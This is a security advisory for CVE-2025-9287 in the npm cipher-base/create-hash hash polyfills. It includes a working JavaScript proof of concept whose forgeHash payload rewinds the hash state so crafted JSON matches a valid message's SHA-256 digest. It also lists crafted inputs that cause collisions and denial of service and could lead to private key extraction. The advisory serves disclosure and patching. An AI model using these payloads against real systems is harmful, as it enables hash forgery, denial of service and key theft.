  - CVE-2025-9287
summary: |
  cipher-base is missing type checks, leading to hash rewind and passing on crafted data
  ### Summary

  This affects e.g. `create-hash` (and `crypto-browserify`), so I'll describe the issue against that package
  Also affects `create-hmac` and other packages

  Node.js `createHash` works only on strings or instances of Buffer, TypedArray, or DataView.

  Missing input type checks (in npm `create-hash` polyfill of Node.js `createHash`) can allow types other than a well-formed `Buffer` or `string`, resulting in invalid values, hanging and rewinding the hash state (including turning a tagged hash into an untagged hash), or other generally undefined behaviour.

  ### Details

  See PoC

  ### PoC
  ```js
  const createHash = require('create-hash/browser.js')
  const { randomBytes } = require('crypto')

  const sha256 = (...messages) => {
    const hash = createHash('sha256')
    messages.forEach((m) => hash.update(m))
    return hash.digest('hex')
  }

  const validMessage = [randomBytes(32), randomBytes(32), randomBytes(32)] // whatever

  const payload = forgeHash(Buffer.concat(validMessage), 'Hashed input means safe')
  const receivedMessage = JSON.parse(payload) // e.g. over network, whatever

  console.log(sha256(...validMessage))
  console.log(sha256(...receivedMessage))
  console.log(receivedMessage[0])
  ```

  Output:
  ```
  9ef59a6a745990b09bbf1d99abe43a4308b48ce365935e29eb4c9000984ee9a9
  9ef59a6a745990b09bbf1d99abe43a4308b48ce365935e29eb4c9000984ee9a9
  Hashed input means safe
  ```

  This works with:
  ```js
  const forgeHash = (valid, wanted) => JSON.stringify([wanted, { length: -wanted.length }, { ...valid, length: valid.length }])
  ```

  But there are other types of input which lead to unchecked results

  ### Impact

  1. Hash state rewind on `{length: -x}`. This is behind the PoC above, also this way an attacker can turn a tagged hash in cryptographic libraries into an untagged hash.
  2. Value miscalculation, e.g. a collision is generated by `{ length: buf.length, ...buf, 0: buf[0] + 256 }`
      This will result in the same hash as of `buf`, but can be treated by other code differently (e.g. bn.js)
  4. DoS on `{length:'1e99'}`
  5. On a subsequent system, (2) can turn into matching hashes but different numeric representations, leading to issues up to private key extraction from cryptography libraries (as nonce is often generated through a hash, and matching nonces for different values often immediately leads to private key restoration, like [GHSA-vjh7-7g9h-fjfh](https://github.com/indutny/elliptic/security/advisories/GHSA-vjh7-7g9h-fjfh))
  6. Also, other typed arrays results are invalid, e.g. returned hash of `new Uint16Array(5)` is the same as `new Uint8Array(5)`, not `new Uint16Array(10)` as it should have been (and is in Node.js `crypto`) -- same for arrays with values non-zero, their hashes are just truncated to `%256` instead of converted to correct bytelength
